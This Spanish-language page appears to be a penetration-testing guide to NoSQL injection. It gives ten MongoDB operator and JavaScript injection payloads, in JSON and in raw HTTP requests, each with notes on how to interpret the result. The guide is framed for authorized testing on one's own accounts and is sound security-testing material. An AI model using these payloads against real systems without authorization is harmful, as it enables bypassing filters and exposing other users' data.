# 🗡️ NoSQL injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Operador $ne en campo escalar

**Objetivo:** Usar búsqueda de objetos propios; el esquema debería esperar una cadena.

```json
{"name":{"$ne":"prueba-inexistente"}}
```

**Interpretación:** Una respuesta más amplia solo sugiere que se interpretó un operador; controlar con valor literal.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 2. Rango $gt/$lt

**Objetivo:** Probar un filtro numérico de datos de laboratorio con valores acotados.

```json
{"price":{"$gt":1,"$lt":3}}
```

**Interpretación:** El servidor debería rechazar objetos si solo admite un precio exacto; verificar conjunto esperado.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 3. Expresión regular anclada

**Objetivo:** Usar un nombre de cuenta u objeto propio, sin enumerar terceros.

```json
{"name":{"$regex":"^prueba-123$"}}
```

**Interpretación:** Distinguir soporte legítimo de regex de inyección mediante contrato de API.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 4. Operador $in

**Objetivo:** Comparar dos identificadores de objetos controlados para detectar filtros ampliados.

```json
{"name":{"$in":["prueba-123","prueba-456"]}}
```

**Interpretación:** Que se acepten listas puede ser funcionalidad; hay fallo si se trató como cadena y se salta una restricción.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 5. Operadores en formulario urlencoded

**Objetivo:** Solo si el framework parsea claves con corchetes a objetos, como algunas pilas Node/PHP.

```http
POST /api/search HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

name%5B%24ne%5D=prueba-inexistente
```

**Interpretación:** Comparar con name=prueba-inexistente; no extrapolar de JSON al parser de formularios.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 6. Tipo booleano inesperado

**Objetivo:** Comprobar que el filtro de string no acepta booleanos u objetos.

```json
{"name":true}
```

**Interpretación:** Una respuesta distinta puede ser coerción normal; demostrar cambio de criterio de búsqueda.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 7. $where inocuo en laboratorio

**Objetivo:** MongoDB con $where habilitado y permiso expreso; no usar bucles ni exfiltración.

```json
{"$where":"this.name === 'prueba-123'"}
```

**Interpretación:** Una consulta aceptada solo importa si el operador proviene del cliente y cambia el filtro previsto.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 8. $exists sobre campo esperado escalar

**Objetivo:** Filtrar datos de prueba; el backend no debería aceptar un objeto operador en lugar de texto.

```json
{"name":{"$exists":true}}
```

**Interpretación:** Puede ser funcionalidad de búsqueda avanzada; demostrar el contrato y el resultado no permitido.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 9. $nin en filtro de prueba

**Objetivo:** Comparar una exclusión de dos valores controlados con igualdad literal.

```json
{"name":{"$nin":["prueba-123","prueba-456"]}}
```

**Interpretación:** Si aparecen objetos que el usuario no debería consultar, confirmar además autorización por objeto.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 10. Sintaxis JavaScript booleana en string

**Objetivo:** Solo si el backend concatena una categoría propia dentro de una expresión JavaScript para consultar MongoDB.

```http
GET /api/items?category=prueba%27%20%26%26%201%20%26%26%20%27x HTTP/1.1
Host: {ORIGEN}

GET /api/items?category=prueba%27%20%26%26%200%20%26%26%20%27x HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** El diferencial verdadero/falso debe afectar la selección de objetos propios; la respuesta 400 por sintaxis no confirma inyección.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/nosql-injection).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
